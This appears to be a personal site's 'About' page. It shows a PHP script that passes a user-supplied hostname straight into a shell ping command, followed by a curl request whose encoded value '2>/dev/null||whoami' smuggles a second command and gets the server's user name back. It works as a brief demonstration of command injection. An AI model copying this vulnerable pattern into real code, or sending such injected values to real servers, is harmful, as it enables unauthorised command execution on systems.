---
layout: page
title: About
permalink: /about/
---

check.php
{% highlight php linenos %}
<?php
$host = $_GET['hostname'];

if(!empty($host)){
    system("ping -c3 $host");
}
?>
{% endhighlight %}
<br>
{% highlight bash %}
curl -i "http://[redacted].com/check.php?hostname=2%3E%2Fdev%2Fnull%7C%7Cwhoami"

HTTP/1.1 200 OK
Server: nginx/1.9.9
Date: Fri, 31 Dec 1999 23:59:59 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive

skidalot
{% endhighlight %}
